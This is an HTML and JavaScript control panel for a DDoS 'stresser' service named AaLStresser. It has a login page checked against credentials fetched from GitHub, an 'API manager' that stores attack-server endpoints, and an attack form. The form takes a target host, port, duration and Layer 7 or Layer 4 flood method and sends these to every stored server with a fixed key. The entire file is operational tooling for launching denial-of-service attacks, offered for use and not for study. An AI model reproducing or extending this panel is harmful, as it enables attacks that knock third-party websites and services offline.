<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>AalStresserExecutor - Extra Version</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      font-family: 'Poppins', sans-serif;
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
      padding: 20px;
    }
    .card {
      background: rgba(20, 20, 30, 0.95);
      color: #ffffff;
      padding: 40px 30px;
      border-radius: 20px;
      box-shadow: 0 0 25px rgba(0, 216, 255, 0.4);
      width: 100%;
      max-width: 450px;
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
      color: #00eaff;
      font-weight: 600;
      text-shadow: 0 0 8px #00eaff;
    }
    label { margin-top: 15px; font-size: 14px; color: #90caf9; display: block; }
    input, select {
      width: 100%; padding: 12px; margin-top: 8px;
      border-radius: 10px; border: 1px solid #00eaff60;
      background: #101820; color: #ffffff; font-size: 14px; transition: 0.3s;
    }
    input:focus, select:focus { outline: none; border-color: #00eaff; box-shadow: 0 0 8px #00eaff80; }
    button {
      margin-top: 20px; width: 100%; padding: 12px;
      background: linear-gradient(90deg, #00eaff, #9c27b0);
      color: #ffffff; font-size: 16px; font-weight: 600;
      border: none; border-radius: 10px; cursor: pointer; transition: 0.3s;
    }
    button:hover { opacity: 0.85; }
    #result { margin-top: 20px; display: none; text-align: center; font-size: 14px; }
    #countdown { margin-top: 10px; font-size: 18px; font-weight: bold; color: #ffeb3b; text-shadow: 0 0 6px #ff0; }
    .loader {
      border: 5px solid #2c5364; border-top: 5px solid #00eaff; border-radius: 50%;
      width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    ul { margin-top: 15px; list-style: none; padding: 0; }
    li { margin: 5px 0; background: #101820; padding: 8px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; }
    li button { padding: 5px 10px; font-size: 12px; margin-top: 0; background: #e53935; }
  </style>
</head>
<body>
  <!-- LOGIN PAGE -->
  <div id="login" class="card">
    <h2>Login</h2>
    <label>Username</label>
    <input type="text" id="login-username" placeholder="Enter username">
    <label>Password</label>
    <input type="password" id="login-password" placeholder="Enter password">
    <button onclick="validateLogin()">Login</button>
    <div id="login-loader" style="display:none;" class="loader"></div>
  </div>

  <!-- MAIN ATTACK PAGE -->
  <div id="main" class="card" style="display:none;">
    <h2>AaLStresser</h2>
    <label>HOST</label>
    <input type="text" id="host" placeholder="https://example.com">
    <label>PORT</label>
    <input type="number" id="port" placeholder="443">
    <label>TIME</label>
    <input type="number" id="time" placeholder="60">
    <label>ATTACK METHOD</label>
    <select id="method">
      <optgroup label="LAYER 7">
        <option value="h2-hold">H2-HOLD</option>
        <option value="h2-fast">H2-FAST</option>
        <option value="browsern">BROWSERN</option>
        <option value="refresh">REFRESH</option>
      </optgroup>
      <optgroup label="LAYER 4">
        <option value="tcp-pps">TCP-PPS</option>
        <option value="udp-pps">UDP-PPS</option>
      </optgroup>
    </select>
    <button onclick="showApiManager()">Add Server</button>
    <button onclick="generateAPI()">Confirm Attack</button>

    <div id="result"></div>
    <div id="countdown"></div>
  </div>

  <!-- API MANAGER PAGE -->
  <div id="api-manager" class="card" style="display:none;">
    <h2>API Manager</h2>
    <input type="text" id="new-api" placeholder="IP:PORT">
    <button onclick="addAPI()">Add API</button>
    <ul id="api-list"></ul>
    <button onclick="backToMain()">⬅ Back</button>
  </div>

  <script>
    let apiList = JSON.parse(localStorage.getItem("apiList")) || [];

    window.onload = () => {
      // Cek login status
      if (localStorage.getItem("isLoggedIn") === "true") {
        document.getElementById("login").style.display = "none";
        document.getElementById("main").style.display = "block";
      }
      renderApiList();
    };

    async function validateLogin() {
      const username = document.getElementById("login-username").value.trim();
      const password = document.getElementById("login-password").value.trim();
      const loader = document.getElementById("login-loader");

      if (!username || !password) {
        Swal.fire('Warning', 'Please fill in all fields.', 'warning');
        return;
      }

      loader.style.display = "block";
      try {
        const [userRes, passRes] = await Promise.all([
          fetch("https://raw.githubusercontent.com/Ambroj/login-data/refs/heads/main/username2.txt"),
          fetch("https://raw.githubusercontent.com/Ambroj/Pswrd/refs/heads/main/password2.txt")
        ]);
        const validUser = (await userRes.text()).trim();
        const validPass = (await passRes.text()).trim();

        if (username === validUser && password === validPass) {
          Swal.fire('Success', 'Login Successful!', 'success');
          document.getElementById("login").style.display = "none";
          document.getElementById("main").style.display = "block";
          localStorage.setItem("isLoggedIn", "true"); // simpan status login
        } else {
          Swal.fire('Error', 'Invalid username or password.', 'error');
        }
      } catch {
        Swal.fire('Error', 'Login failed.', 'error');
      } finally {
        loader.style.display = "none";
      }
    }

    function showApiManager() {
      document.getElementById("main").style.display = "none";
      document.getElementById("api-manager").style.display = "block";
      renderApiList();
    }

    function backToMain() {
      document.getElementById("api-manager").style.display = "none";
      document.getElementById("main").style.display = "block";
    }

    function addAPI() {
  let newApi = document.getElementById("new-api").value.trim();
  if (!newApi) {
    Swal.fire('Error', 'Please input a valid IP:PORT.', 'error');
    return;
  }

  // bersihin kalau user masukin /api/Aal manual
  newApi = newApi.replace(/\/api\/Aal$/i, "");

  // otomatis tambahin http:// + /api/Aal
  const fullApi = `http://${newApi}/api/Aal`;

  if (!apiList.includes(fullApi)) {
    apiList.push(fullApi);
    localStorage.setItem("apiList", JSON.stringify(apiList)); 
    Swal.fire('Added', `API added: ${fullApi}`, 'success');
    document.getElementById("new-api").value = "";
    renderApiList();
  } else {
    Swal.fire('Error', 'Duplicate API.', 'error');
  }
}

    function renderApiList() {
      const list = document.getElementById("api-list");
      list.innerHTML = "";
      apiList.forEach((api, i) => {
        const li = document.createElement("li");
        li.innerHTML = `${api} <button onclick="removeApi(${i})">❌</button>`;
        list.appendChild(li);
      });
    }

    function removeApi(index) {
      apiList.splice(index, 1);
      localStorage.setItem("apiList", JSON.stringify(apiList)); // update storage
      renderApiList();
    }

    async function generateAPI() {
  const host = document.getElementById("host").value;
  const port = document.getElementById("port").value;
  const time = parseInt(document.getElementById("time").value);
  const method = document.getElementById("method").value;
  const resultDiv = document.getElementById("result");
  const countdownDiv = document.getElementById("countdown");

  if (!host || !port || !time || !method) {
    Swal.fire('Warning', 'Please complete all fields.', 'warning');
    return;
  }
  if (apiList.length === 0) {
    Swal.fire('Warning', 'Please add at least one API.', 'warning');
    return;
  }

  Swal.showLoading();

  // langsung kirim request tanpa cek error
  const params = `?key=Aal&host=${host}&port=${port}&time=${time}&method=${method}`;
  for (const api of apiList) {
    try { fetch(api + params); } catch {}
  }

  Swal.close();

  resultDiv.style.display = "block";
  resultDiv.innerHTML = `<p>Attack Info:</p>
    <p>Host: ${host}</p>
    <p>Port: ${port}</p>
    <p>Time: ${time}</p>
    <p>Method: ${method.toUpperCase()}</p>`;

  // Countdown timer
  let remaining = time;
  countdownDiv.style.display = "block";
  countdownDiv.innerHTML = `⏳ ${remaining}s`;

  const interval = setInterval(() => {
    remaining -= 1.5;
    if (remaining <= 0) {
      clearInterval(interval);
      countdownDiv.innerHTML = "✅ Finished!";
    } else {
      countdownDiv.innerHTML = `⏳ ${Math.ceil(remaining)}s`;
    }
  }, 1500);

  Swal.fire('Success', 'Attack sent successfully!', 'success');
}
  </script>
</body>
</html>